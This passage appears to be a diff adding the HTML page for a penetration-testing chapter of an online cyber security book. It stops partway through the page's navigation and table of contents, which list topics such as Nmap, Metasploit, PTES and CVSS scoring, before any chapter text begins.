@@ -1,0 +1,2284 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://data-octo.github.io/book/cyber_security_practical/chapter09-penetration-testing/">
+      
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+    
+    
+      
+        <title>Chapter09 penetration testing - Data Octo</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.e53b48f4.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#learning-objectives" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Data Octo" class="md-header__button md-logo" aria-label="Data Octo" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Data Octo
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Chapter09 penetration testing
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Data Octo" class="md-nav__button md-logo" aria-label="Data Octo" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Data Octo
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../home.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Blog
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Posts
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/archive/2026/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2026
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/ai/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AI
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/business-analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Business Analysis
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/productivity/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Productivity
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/software-development/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Software Development
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/xplore-rec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Xplore Rec
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Books
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Books
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Books Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Portfolio
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Portfolio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../portfolio/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Portfolio Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#learning-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      Learning Objectives
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-is-asset-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      What is Asset Security?
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="What is Asset Security?">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#key-concepts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Key Concepts
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#penetration-testing-methodology" class="md-nav__link">
+    <span class="md-ellipsis">
+      Penetration Testing Methodology
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Penetration Testing Methodology">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-penetration-testing-lifecycle" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Penetration Testing Lifecycle
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="The Penetration Testing Lifecycle">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-planning-preparation" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Planning &amp; Preparation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-reconnaissance-osint" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Reconnaissance (OSINT)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-scanning-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Scanning &amp; Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-gaining-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Gaining Access
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-maintaining-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Maintaining Access
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-analysis-reporting" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Analysis &amp; Reporting
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#osint-open-source-intelligence" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSINT (Open Source Intelligence)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSINT (Open Source Intelligence)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#osint-process" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSINT Process
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#osint-sources" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSINT Sources
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSINT Sources">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#public-sources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Public Sources
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#technical-sources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Technical Sources
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#osint-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSINT Tools
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#network-scanning-with-nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Network Scanning with Nmap
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Network Scanning with Nmap">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap-scan-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap Scan Types
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Nmap Scan Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-tcp-connect-scan-st" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. TCP Connect Scan (-sT)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-syn-scan-ss" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. SYN Scan (-sS)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-udp-scan-su" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. UDP Scan (-sU)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-version-detection-sv" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Version Detection (-sV)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-os-detection-o" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. OS Detection (-O)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advanced-nmap-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced Nmap Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Advanced Nmap Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-range-specification" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Range Specification
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#timing-and-performance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Timing and Performance
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#output-formats" class="md-nav__link">
+    <span class="md-ellipsis">
+      Output Formats
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metasploit-framework" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit Framework
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Metasploit Framework">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#metasploit-architecture" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit Architecture
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metasploit-components" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit Components
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Metasploit Components">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Exploits
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-auxiliary-modules" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Auxiliary Modules
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#basic-metasploit-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Metasploit Usage
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Basic Metasploit Usage">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#starting-metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Starting Metasploit
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#searching-for-modules" class="md-nav__link">
+    <span class="md-ellipsis">
+      Searching for Modules
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Exploits
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-exploitation-with-meterpreter" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation with Meterpreter
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-and-wireless-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web and Wireless Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web and Wireless Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#web-application-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web Application Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Application Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-web-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Web Vulnerabilities
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wireless-network-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Wireless Network Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Wireless Network Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#wireless-attack-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      Wireless Attack Types
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ptes-penetration-testing-execution-standard" class="md-nav__link">
+    <span class="md-ellipsis">
+      PTES (Penetration Testing Execution Standard)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PTES (Penetration Testing Execution Standard)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ptes-phases" class="md-nav__link">
+    <span class="md-ellipsis">
+      PTES Phases
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PTES Phases">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-pre-engagement" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Pre-engagement
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-intelligence-gathering" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Intelligence Gathering
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-threat-modeling" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Threat Modeling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-vulnerability-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Vulnerability Analysis
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-post-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Post Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-reporting" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. Reporting
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cvss-scoring" class="md-nav__link">
+    <span class="md-ellipsis">
+      CVSS Scoring
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CVSS Scoring">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cvss-components" class="md-nav__link">
+    <span class="md-ellipsis">
+      CVSS Components
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cvss-base-score-calculation" class="md-nav__link">
+    <span class="md-ellipsis">
+      CVSS Base Score Calculation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CVSS Base Score Calculation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-vector-av" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Vector (AV)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-complexity-ac" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Complexity (AC)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privileges-required-pr" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privileges Required (PR)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-interaction-ui" class="md-nav__link">
+    <span class="md-ellipsis">
+      User Interaction (UI)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scope-s" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scope (S)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#impact-metrics" class="md-nav__link">
+    <span class="md-ellipsis">
+      Impact Metrics
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cvss-score-ranges" class="md-nav__link">
+    <span class="md-ellipsis">
+      CVSS Score Ranges
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-cvss-calculation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example CVSS Calculation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hands-on-activities" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hands-On Activities
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hands-On Activities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#activity-1-osint-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Activity 1: OSINT Reconnaissance
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#activity-2-network-scanning-with-nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Activity 2: Network Scanning with Nmap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#activity-3-metasploit-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Activity 3: Metasploit Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#activity-4-web-application-penetration-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Activity 4: Web Application Penetration Testing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#activity-5-penetration-test-report" class="md-nav__link">
+    <span class="md-ellipsis">
+      Activity 5: Penetration Test Report
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
